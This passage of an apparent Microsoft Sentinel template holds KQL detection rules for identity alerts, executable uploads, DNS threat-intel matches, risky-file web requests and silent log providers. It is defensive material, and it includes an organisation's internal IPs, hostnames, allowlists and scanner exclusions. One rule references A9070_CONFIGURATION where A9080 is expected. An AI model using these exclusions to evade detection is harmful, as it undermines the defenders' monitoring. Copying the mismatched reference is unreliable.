= AccountName         \n| mv-apply e = A940_EXCLUSION_V2 on (\n    extend keys = bag_keys(e) \n    | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n    | extend bv_signature_id_excluded = iff(bv_signature_id contains e.bv_signature_id, true,false)              \n    | extend bv_process_command_line_excluded = iff(bv_process_command_line contains e.bv_process_command_line, true, false)\n    | extend bv_signature_excluded = iff(bv_signature contains e.bv_signature, true,false)\n    | extend bv_src_host_excluded = iff(bv_src_host contains e.bv_src_host, true,false)\n    | extend bv_host_excluded = iff(bv_host contains e.bv_host, true,false)              \n    | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user, true,false)\n    | extend excluded_count = \n            iff(bv_process_command_line_excluded and isnotempty(e.bv_process_command_line), 1,0)\n            + iff(bv_signature_excluded and isnotempty(e.bv_signature), 1,0)\n            + iff(bv_src_host_excluded and isnotempty(e.bv_src_host), 1,0)\n            + iff(bv_host_excluded and isnotempty(e.bv_host), 1,0)                      \n            + iff(bv_src_user_excluded and isnotempty(e.bv_src_user), 1,0)\n            + iff(bv_signature_id_excluded and isnotempty(e.bv_signature_id), 1,0)                      \n    | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n    | summarize excluded=make_set(excluded)\n)\n| parse Description with * 'suspicious account enumeration, exposing ' number_account: int ' existing' * 'access ' cushost_name '.'\n| extend host_name_cnt = iff(cushost_name has 'resources', toint(split(cushost_name, ' ')[0]), 1)      \n| mv-apply th=threshold on (\n    extend sig = iff(isnotempty(th.signature), tostring(th.signature), '') \n    , threshold1 = iff(isnotempty(th.details['threshold1']), tostring(th.details['threshold1']), '')\n    , threshold2 = iff(isnotempty(th.details['threshold2']), tostring(th.details['threshold2']), '')\n    | extend match = sig =~ AlertName and number_account >= toint(threshold1) and host_name_cnt >= toint(threshold2)\n| summarize match_threshold = countif(match)\n)\n| extend match_threshold = iff(match_threshold >= 1, true, false)     \n      , ExcludedEvent = iff(excluded contains 'true' or bv_signature in (ExcludedSignatures), true, false)\n      , ExcludedRules = iff(AlertName in (bv_940_global_excluded_rules), true, false)\n//Exclude known scanners\n| extend ExcludedScanner = iff(array_length(set_intersect(HostName,WHITELISTED_SCANNERS)) > 0 , true, false)\n| extend ExcludedScanner = iff(AttackerHost in (WHITELISTED_SCANNERS) , true, ExcludedScanner)\n| extend ExcludedScanner = iff(tolower(HostName) matches regex 'nessus|qualys|tenable', true, ExcludedScanner)\n| extend Successful = iff(Description contains 'successful', true, false)\n| extend Class = iff(ExcludedEvent or ExcludedScanner or (ExcludedRules and Successful == false), 'RBA', 'SOC')\n| extend Class = iff(match_threshold, 'SOC', Class)\n| extend Tags = case(Class =~ 'RBA', 'tag: RBA', 'tag: SOC')\n//Extract out alert links\n| extend ParsedExtendedLinks = parse_json(ExtendedLinks)\n| mv-apply links = ParsedExtendedLinks on ( \n    extend AlertLink = iff(links.Label =~ 'Defender for Cloud Apps alert ID', links.Href, '')\n    | extend AlertPolicy = iff(links.Label =~ 'Defender for Cloud Apps policy ID', links.Href, '')\n    | summarize AlertLink=make_set_if(AlertLink, isnotempty(AlertLink)), AlertPolicy=make_set_if(AlertPolicy, isnotempty(AlertPolicy))\n)\n| extend bv_severity = iff(Class == 'RBA', 'Medium', bv_severity)\n| join kind=leftouter AssociatedEnt on $left.HostName1 == $right.ent\n| join kind=leftouter AssociatedEnt on $left.HostName2 == $right.ent\n| join kind=leftouter DeviceDetails on $left.HostName1 == $right.trustedHost\n| join kind=leftouter DeviceDetails on $left.HostName2 == $right.trustedHost\n| extend bv_trust_type = set_union(trustType, trustType1)\n      , bv_hist_alert_name = set_union(bv_hist_alert_name, bv_hist_alert_name1) \n| invoke gen_detail_and_hash(excluded_description_fields, 300, 5,efd=excluded_dedup_fields,dh=calculate_hash)\n| extend bv_alert_link = AlertLink[0]\n      , bv_alert_policy = AlertPolicy[0]\n      , bv_alarm_attacker_entities = bv_host\n      , bv_alarm_victim_entities = AccountName\n      , bv_host1 = HostName1\n      , bv_host2 = HostName2\n      , bv_host_dnsdomain1 = HostDNSDomain1\n      , bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, '1', rba_score) \n      , bv_src_user1 = bv_src_user[0]    \n| lookup bv_940_msft_description on UniqueExternalId   \n| extend ExtendedDescription = strcat(exp, '\\n', bv_vendor_description, '\\n', ExtendedDescription\n      , ' \\n\\nOriginal Alert Query:\\n', 'SecurityAlert\\n|where TimeGenerated==todatetime(\"', bv_alert_time, '\")\\n|where   SystemAlertId == \"', bv_alert_id, '\"\\n')\n| extend bv_rule_version = '1.4.5342'\n| extend bv_rule_timestamp = '1718204781.2907748'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.4.5342 bv_rule_timestamp: 1718204781.2907748'\n| project-keep bv_*\n  , ExtendedDescription\n  , Tags\n  , Class\n  , Tactics",
          "queryFrequency": "PT1H",
          "queryPeriod": "P3D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Persistence",
            "Execution",
            "DefenseEvasion",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1566",
            "T1098",
            "T1559",
            "T1055"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-940: [{{Class}}] MDI - {{bv_signature}} from entity {{bv_src_dvc}}",
            "alertDescriptionFormat": "{{ExtendedDescription}}\n\nMITRE: T1566 \nCategory: Defender for Identity\n{{Tags}}\n{{bv_rule_combined_string}}",
            "alertTacticsColumnName": "Tactics",
            "alertSeverityColumnName": "bv_severity"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bv_orig_alert_id": "bv_orig_alert_id"
          },
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "DnsDomain",
                  "columnName": "bv_host_dnsdomain1"
                },
                {
                  "identifier": "HostName",
                  "columnName": "bv_host1"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_host"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user1"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8b77417c-47eb-4e2d-bf83-80bce88c173b')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8b77417c-47eb-4e2d-bf83-80bce88c173b')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "New executable via Office FileUploaded Operation",
          "description": "Identifies when executable file types are uploaded to Office services such as SharePoint and OneDrive.\nList currently includes 'exe', 'inf', 'gzip', 'cmd', 'bat' file extensions.\nAdditionally, identifies when a given user is uploading these files to another users workspace.\nThis may be indication of a staging location for malware or other malicious activity.",
          "severity": "Low",
          "enabled": true,
          "query": "// a threshold can be enabled, see commented line below for PrevSeenCount\nlet threshold = 2;\nlet uploadOp = 'FileUploaded';\n// Extensions that are interesting. Add/Remove to this list as you see fit\nlet execExt = dynamic(['exe', 'inf', 'gzip', 'cmd', 'bat']);\nlet starttime = 8d;\nlet endtime = 1d;\nOfficeActivity | where TimeGenerated >= ago(endtime)\n// Limited to File Uploads due to potential noise, comment out the Operation statement below to include any operation type\n// Additional, but potentially noisy operation types that include Uploads and Downloads can be included by adding the following - Operation contains \"upload\" or Operation contains \"download\"\n| where Operation =~ uploadOp\n| where SourceFileExtension has_any (execExt)\n| project TimeGenerated, OfficeId, OfficeWorkload, RecordType, Operation, UserType, UserKey, UserId, ClientIP, UserAgent, Site_Url, SourceRelativeUrl, SourceFileName\n| join kind= leftanti (\nOfficeActivity | where TimeGenerated between (ago(starttime) .. ago(endtime))\n| where Operation =~ uploadOp\n| where SourceFileExtension has_any (execExt)\n| summarize SourceRelativeUrl = make_set(SourceRelativeUrl), UserId = make_set(UserId) , PrevSeenCount = count() by SourceFileName\n// To exclude previous matches when only above a specific count, change threshold above and uncomment the line below\n//| where PrevSeenCount > threshold\n| mvexpand SourceRelativeUrl, UserId\n| extend SourceRelativeUrl = tostring(SourceRelativeUrl), UserId = tostring(UserId)\n) on SourceFileName, SourceRelativeUrl, UserId \n| extend SiteUrlUserFolder = tolower(split(Site_Url, '/')[-2])\n| extend UserIdUserFolderFormat = tolower(replace('@|\\\\.', '_',UserId))\n// identify when UserId is not a match to the specific site url personal folder reference\n| extend UserIdDiffThanUserFolder = iff(Site_Url has '/personal/' and SiteUrlUserFolder != UserIdUserFolderFormat, true , false ) \n| summarize TimeGenerated = make_list(TimeGenerated), StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), \nUserAgents = make_list(UserAgent), OfficeIds = make_list(OfficeId), SourceRelativeUrls = make_list(SourceRelativeUrl), FileNames = make_list(SourceFileName)\nby OfficeWorkload, RecordType, Operation, UserType, UserKey, UserId, ClientIP, Site_Url, SiteUrlUserFolder, UserIdUserFolderFormat, UserIdDiffThanUserFolder",
          "queryFrequency": "P1D",
          "queryPeriod": "P8D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1105"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "d722831e-88f5-4e25-b106-4ef6e29f8c13",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserId"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/43655b86-fc4a-4441-8740-57e11973da98')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/43655b86-fc4a-4441-8740-57e11973da98')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TEMP - Detect SFTP logs source - CMDCSSL1038UL",
          "description": "This is rule is identifying any suspicious traffic from sftp server source 100.97.21.37 to destination 169.2.133.x",
          "severity": "Medium",
          "enabled": true,
          "query": "(\r\nCommonSecurityLog\r\n| where SourceHostName contains \"CMDCSSL1038UL\" | where DestinationIP contains \"169.2.133\"\r\n| where TimeGenerated >= ago(5min)\r\n)\r\n\r\n\r\n",
          "queryFrequency": "PT5M",
          "queryPeriod": "PT5M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDynamicProperties": []
          },
          "customDetails": {},
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "SourceHostName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "DestinationIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/3295850f-dd0c-4b5b-bfee-c7caa8fa9e45')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/3295850f-dd0c-4b5b-bfee-c7caa8fa9e45')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "REFINED 1/6/2024 - TI map IP entity to DNS Events (ASIM DNS schema)",
          "description": "This rule identifies DNS requests for which response IP address is a known IoC. This analytic rule uses [ASIM](https://aka.ms/AboutASIM) and supports any built-in or custom source that supports the ASIM DNS schema.",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet Trusted_Domain = dynamic([\"fp2e7a.wpc.2be4.phicdn.net\", \"dynmsg.modpim.com\", \"crl.verisign.com\", \"aia.makeidentitysafe.com\", \"fp2e7a.wpc.phicdn.net\", \"arc.msn.com\", \"crl3.digicert.com\", \"crl-symcprod.digicert.com\", \"tl.symcb.com\", \"crl.thawte.com\", \"g.symcb.com\", \"t1.symcb.com\"]); // List of trusted domains\nlet Trusted_IP = dynamic([\"165.235.15.60\"]); // List of trusted IPs - // 165.235.15.60 CDT\nlet Trusted_Domain_Regex = @\"^.*\\.digicert\\.com$|^.*\\.symcb\\.com$|^.*\\.microsoft.com$|^.*\\.symantec.com\"; // Regex for multiple\nThreatIntelligenceIndicator\n| where TimeGenerated >= ago(ioc_lookBack)\n| extend IoC = coalesce(NetworkIP, NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress, \"NO_IP\")\n| where IoC != \"NO_IP\"\n| where IoC !in (Trusted_IP) // Exclude trusted IPs dynamically\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n| join kind=innerunique\n    (\n    _Im_Dns(starttime=ago(dt_lookBack))\n    | where isnotempty(DnsResponseName)\n    | summarize imDns_mintime = min(TimeGenerated), imDns_maxtime = max(TimeGenerated) by SrcIpAddr, DnsQuery, DnsResponseName, Dvc, EventProduct, EventVendor\n    | extend addresses = extract_all(@'(\\d+\\.\\d+\\.\\d+\\.\\d+)', DnsResponseName)\n    | mv-expand IoC = addresses to typeof(string)\n    )\n    on IoC\n| where imDns_mintime < ExpirationDateTime\n| where DnsQuery !in (Trusted_Domain)\n| where not(DnsQuery matches regex Trusted_Domain_Regex) // Match domains with regex\n| project\n    imDns_mintime,\n    imDns_maxtime,\n    Description,\n    ActivityGroupNames,\n    IndicatorId,\n    ThreatType,\n    LatestIndicatorTime,\n    ExpirationDateTime,\n    ConfidenceScore,\n    SrcIpAddr,\n    IoC,\n    Dvc,\n    EventVendor,\n    EventProduct,\n    DnsQuery,\n    DnsResponseName;",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "67775878-7f8b-4380-ac54-115e1e828901",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT3H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "The response {{IoC}} to DNS query matched an IoC",
            "alertDescriptionFormat": "The response address {{IoC}} to a DNS query matched a known indicator of compromise of {{ThreatType}}.  DNS Query  {{{DnsQuery}}   . Consult the threat intelligence blade for more information on the indicator.",
            "alertDynamicProperties": []
          },
          "customDetails": {
            "ExpirationDateTime": "ExpirationDateTime",
            "ThreatType": "ThreatType",
            "ActivityGroupNames": "ActivityGroupNames",
            "LatestIndicatorTime": "LatestIndicatorTime",
            "ConfidenceScore": "ConfidenceScore",
            "IndicatorId": "IndicatorId",
            "DNSRequestTime": "imDns_mintime",
            "DnsQuery": "DnsQuery",
            "Description": "Description",
            "SourceIPAddress": "SrcIpAddr"
          },
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Dvc"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IoC"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "DnsQuery"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/1b565620-506f-4d55-902f-c893fc07ca83')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/1b565620-506f-4d55-902f-c893fc07ca83')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detect web requests to potentially harmful files (ASIM Web Session)",
          "description": "This rule detects web requests made to URLs containing file types such as .ps1, .bat, .vbs,.scr etc. which have the potential to be harmful if downloaded. This rule uses the [Advanced Security Information Model (ASIM)](https://aka.ms/AboutASIM) and supports any web session source that complies with ASIM.",
          "severity": "Medium",
          "enabled": false,
          "query": "let lookback = 5m;\nlet RiskyFileExtensions = materialize(externaldata(Extensions: string)\n    [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/RiskyFileExtensionsInUrl.csv\"]\n    with(format=\"csv\", ignoreFirstRecord=True));\nlet CustomRiskyFileExtensions = (_ASIM_GetWatchlistRaw(\"Web_RiskyFileExtensions\") // Create new Watchlist and add your custom indicators(Optional)\n    | extend\n        Extensions = tostring(WatchlistItem[\"Extensions\"])\n    | project Extensions\n    | where isnotempty(Extensions));\nlet CombinedRiskyFileExtensions = union RiskyFileExtensions, CustomRiskyFileExtensions;\nlet knownRiskyFileExtensions=toscalar(CombinedRiskyFileExtensions\n    | where isnotempty(Extensions)\n    | summarize make_set(Extensions, 1000));\nlet Whitelisted_Domains = materialize(externaldata(WhiteListedDomains: string)\n    [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/WhiteListedDomainsForWebSessionUseCases.csv\"]\n    with(format=\"csv\", ignoreFirstRecord=True));\nlet CustomWhiteListedDomains = (_ASIM_GetWatchlistRaw(\"Web_WhiteListedDomains\") // Create new Watchlist and add your white listed domains(Optional)\n    | extend\n        WhiteListedDomains = tostring(WatchlistItem[\"WhiteListedDomains\"])\n    | project WhiteListedDomains\n    | where isnotempty(WhiteListedDomains));\nlet CombinedWhitelisted_Domains = union Whitelisted_Domains, CustomWhiteListedDomains;\nlet knownWhitelisted_Domains=toscalar(CombinedWhitelisted_Domains\n    | where isnotempty(WhiteListedDomains)\n    | summarize make_set(WhiteListedDomains, 1000));\n_Im_WebSession (starttime=ago(lookback), url_has_any=knownRiskyFileExtensions, eventresult='Success')\n| project\n    Url,\n    SrcIpAddr,\n    TimeGenerated,\n    SrcUsername,\n    SrcHostname,\n    DstIpAddr,\n    DstPortNumber\n| extend requestedFileName=tostring(split(tostring(parse_url(Url)[\"Path\"]), '/')[-1])\n| extend requestedFileExt=extract(@'(\\.\\w+)$', 1, requestedFileName, typeof(string))\n| where requestedFileExt in~ (knownRiskyFileExtensions)\n| where requestedFileName !contains \"am_delta_\" // generating a lot of noise, known patching. - DanneF\n| where requestedFileName !contains \"hp-cmsl\" // used for Client Management Script Library of HP (bios drivers etc.) -DanneF\n| where requestedFileName !contains \"oc-installer-23.4.2-windows_x64.exe\" // generating hundreds of alerts, regular admin work \n| where requestedFileName !contains \"b63f6fb2-903e-4ef9-9c8d-bde0e0e3b284.exe\" // block AG's daily alert\n| where requestedFileExt !contains \"compositecontent.jar\" // apart of myeclipse 12.24.24 -DF\n| where requestedFileExt !contains \"communitybrandwidgetloader.app\" //Salesforce extension for widget app\n| summarize\n    EventCount=count(),\n    EventStartTime=min(TimeGenerated),\n    EventEndTime=max(TimeGenerated)\n    by\n    SrcUsername,\n    SrcIpAddr,\n    SrcHostname,\n    DstIpAddr,\n    DstPortNumber,\n    Url,\n    requestedFileName\n| extend FQDN = split(parse_url(Url)[\"Host\"], '.')\n| extend Domain = iif(array_length(FQDN) > 1, strcat(FQDN[-2], '.', FQDN[-1]), FQDN)\n| where Domain !in~ (knownWhitelisted_Domains)\n| project-away FQDN\n| extend Name = iif(SrcUsername contains \"@\", tostring(split(SrcUsername,'@',0)[0]),SrcUsername), UPNSuffix = iif(SrcUsername contains \"@\",tostring(split(SrcUsername,'@',1)[0]),\"\")\n",
          "queryFrequency": "PT5M",
          "queryPeriod": "PT5M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Persistence",
            "Execution"
          ],
          "techniques": [
            "T1133",
            "T1203",
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "c6608467-3678-45fe-b038-b590ce6d00fb",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "User '{{SrcUsername}}' with IP address '{{SrcIpAddr}}' accessed a potentially harmful URL",
            "alertDescriptionFormat": "User accessed URL - '{{Url}}' that contains a file - '{{requestedFileName}}' with risky extension. Downloading this file could pose a potential risk"
          },
          "customDetails": {
            "EventStartTime": "EventStartTime",
            "EventCount": "EventCount",
            "EventEndTime": "EventEndTime",
            "DstIpAddr": "DstIpAddr"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            },
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "requestedFileName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "SrcHostname"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9080')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9080')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9080: [Health] SecurityAlert - Silent - A security provider has not been seen",
          "description": "This rule alerts when a SecurityProvider that consistently send data (i.e sent data in the last 10 out of 14 days) and have not reported in the last two days (configurable).\n\nThis rule will not create a new alert for a device previously reported in the last three days.\n\nThresholds can be set per Computer in A9080_CONFIGURATION MITRE:  Category: SecurityAlert tag: Health",
          "severity": "Informational",
          "enabled": true,
          "query": "let start_time = 1d;\nlet suppression_time=3d;\nlet start_time_historical = 14d;\nlet alert_bin = 1d;\nlet max_reportable_days = 7;\nlet Threshold = 3;\n//Make a list of all previously seen computers\nlet RecentAlerts = toscalar(SecurityAlert\n| where TimeGenerated between (ago(suppression_time) .. now())\n| where AlertName startswith 'BV-9080:'\n| extend Computer = todynamic(tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).ProviderName))[0]))\n| summarize make_set_if(Computer, isnotempty(Computer))\n);\nSecurityAlert\n| make-series EventCount=count() on TimeGenerated from ago(start_time_historical) to now() step alert_bin by ProviderName\n| where ProviderName matches regex A9080_EXCLUDED_PROVIDERNAME == false\n| extend (anomalies, score, baseline) = series_decompose_anomalies(EventCount)\n| mv-apply e=EventCount on (\n  summarize TotalDaysMissing=countif(e==0)\n)\n| where TotalDaysMissing < 4\n//Start Calculate days missing\n| extend EventCountString = strcat_array(EventCount, ',')\n| extend DaysMissingString = extract(@'[1-9]*,([,0]+)$',1,EventCountString)\n| extend DaysMissingString = replace_string(DaysMissingString, ',', '')\n| extend DaysMissing = string_size(DaysMissingString)\n//End Calculate Days Missing\n| extend bv_rule_version = '1.0.4895'\n| extend bv_rule_timestamp = '1708456348.0485454'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4895 bv_rule_timestamp: 1708456348.0485454'\n| project ProviderName, Threshold, EventCount, anomalies, score, baseline, DaysMissing\n| where DaysMissing != 0\n| extend Threshold_TimeToMonitor = iff(isnotempty(A9080_CONFIGURATION[ProviderName]), A9070_CONFIGURATION[ProviderName], Threshold)\n| where DaysMissing != 0\n//Max Numbers of days that a divice will report\n| where DaysMissing between( Threshold_TimeToMonitor .. max_reportable_days)\n//Suppression for previously reported devices\n//| where Computer !in (RecentAlerts)\n| summarize Src=make_set(ProviderName), Data=make_set(pack(\"ProviderName\", ProviderName, 'EventCount', EventCount, 'Threshold', Threshold_TimeToMonitor)), EventCount=count() by Threshold_TimeToMonitor\n| extend ExtendedDescription = strcat(\n          'Missing ProviderName count: ', EventCount\n          ,'\\nMissing ProviderName: \\n* ', strcat_array(array_slice(Src,0,20), '\\n* '))\n| extend AlertName = iff(array_length(Src) == 1, strcat(Src[0], ' has been missing for ', Threshold_TimeToMonitor, ' days'), strcat(EventCount, ' computers have been missing for ', Threshold_TimeToMonitor, ' days'))\n|extend bv_start_time = now()\n  , bv_mss_category = 'LogSource Disruption'\n  , bv_alarm_type = 'Silent Provider'\n  , bv_alarm_sub_type = 'EFD v1.0'\n  , bv_alarm_name = 'BV-9080'\n  , bv_alarm_severity = 'low'\n  , sourcetype = 'SecurityAlert'\n  , bv_alarm_threshold = strcat('Provider missing for more than ', Threshold, ' days')\n  , bv_alarm_value = strcat(EventCount, ' providers missing')\n  , bv_severity = 'low'\n  , bv_reporting_dvc = strcat_array(array_slice(Src,0,20), '\\n* ')\n| extend bv_rule_version = '1.0.4895'\n| extend bv_rule_timestamp = '1708456348.0485454'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4895 bv_rule_timestamp: 1708456348.0485454'\n| project-keep Src\n    , Data\n    , ExtendedDescription\n    , AlertName\n    , sourcetype\n    , bv_*",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9080: [Health] SecurityAlerts - {{AlertName}}",
            "alertDescriptionFormat": "This rule alerts when a SecurityProvider that consistently send data (i.e sent data in the last 10 out of 14 days) and have not reported in the last two days (configurable).\n\nThis rule will not create a new alert for a device previously reported in the last three days.\n\nThresholds can be set per Computer in A9080_CONFIGURATION\n\n{{ExtendedDescription}}\n\nCategory: SecurityAlert\ntag: Health\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "ProviderName": "Src"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9090')]",
